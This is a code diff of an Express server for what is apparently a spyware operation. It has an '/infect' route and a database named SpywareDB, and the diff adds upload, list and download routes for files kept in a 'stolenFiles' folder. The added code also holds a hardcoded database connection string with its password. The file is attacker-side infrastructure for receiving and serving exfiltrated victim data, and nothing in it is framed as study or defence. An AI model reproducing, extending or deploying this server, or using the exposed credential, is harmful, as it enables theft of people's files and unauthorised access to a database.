@@ -1,10 +1,25 @@
-import { exec } from 'child_process';
-import { ftp } from '../ftp/fptSrv.js';
 import cors from 'cors';
-import express from 'express';
+import express, { query } from 'express';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import multer from 'multer';
+import { PgHandler } from '../utils/pgManager.js';
+import { config } from 'process';
+
+
+const spywareDB = new PgHandler({
+    config: {
+        "connectionString": "postgresql://SpywareDB_owner:npg_Z4i5OHNpzVJE@ep-quiet-wave-a5ev25su-pooler.us-east-2.aws.neon.tech/SpywareDB?sslmode=require",
+        "ssl": {
+            "rejectUnauthorized": false
+        }
+    },
+    querys: {
+        "getFiles": "SELECT * FROM file",
+        "insertFile": "INSERT INTO file (file_name) VALUES ($1)",
+        "getFile": "SELECT file_name FROM file WHERE id_file = $1"
+    }
+});
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -39,21 +54,47 @@ app.get('/infect', (req, res) => {
 
 });
 
-app.post('/upload', upload.single('file'), (req, res) => {
-    console.log('Uploading file...');
-    console.log(req.file);
-    if (!req.file) {
-        return res.status(400).send('No file uploaded.');
+app.post('/upload', upload.single('file'), async (req, res) => {
+    try {
+        const { file } = req;
+        console.log(file);
+        const queryResult = await spywareDB.exeQuery({ key: 'insertFile', params: [file.filename] });
+        console.log(queryResult);
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Error uploading file:', error);
+        res.status(500).json({ error: 'Error uploading file' });
     }
-    console.log(`File uploaded: ${req.file.filename}`);
-    res.send(`File uploaded: ${req.file.filename}`);
 });
+
+app.get('/getFiles', async (req, res)=>{
+    try {
+
+        const queryResult = await spywareDB.exeQuery({key: 'getFiles'})
+        console.log(queryResult)
+        res.status(200).json({success: true, data: queryResult})
+    } catch (error) {
+        res.status(500).json({error: 'Error getting files'})
+    }
+})
+
+app.get('/getFile/:id', async (req, res) => {
+    try {
+        const {id} = req.params;
+        console.log(id);
+        const [{file_name: data}] = await spywareDB.exeQuery({ key: 'getFile', params: [id] })
+        console.log(data);
+        const filePath = path.join(__dirname, '../stolenFiles', data);
+        console.log(filePath);
+        res.download(filePath, data);
+        //const file
+        //res.status(200).json({ success: true, data });
+    } catch (error) {
+        console.error('Error getting file:', error);
+        res.status(500).json({ error: 'Error getting file' });    
+        }
+})
 
 app.listen(PORT, () => {
     console.log(`Server running at http://localhost:${PORT}`);
-    // ftp.start().then(() => {
-    //     console.log('FTP server started successfully');
-    // }).catch((error) => {
-    //     console.error('Failed to start FTP server:', error);
-    // });
 });
